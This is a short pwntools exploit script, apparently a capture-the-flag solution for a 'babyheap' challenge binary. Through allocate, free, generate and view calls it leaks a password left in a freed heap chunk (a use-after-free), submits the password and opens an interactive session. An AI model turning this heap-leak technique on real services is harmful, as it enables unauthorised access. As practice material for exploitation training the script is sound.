#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './babyheap')
context.terminal = ["tmux", "splitw", "-h"]

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 9001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

def create(size, data):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b">> ", str(size).encode())
    io.sendlineafter(b">> ", data)

def delete():
    io.sendlineafter(b">> ", b"2")

def view():
    io.sendlineafter(b">> ", b"3")
    io.recvline()
    return io.recvline().rstrip()

def generate_password():
    io.sendlineafter(b">> ", b"4")

def guess_password():
    io.sendlineafter(b">> ", b"5")

create(0x20, b"A")
delete()
generate_password()
password = view()
log.success(f"Password: {password}")
create(0x20, password)
guess_password()

io.interactive()

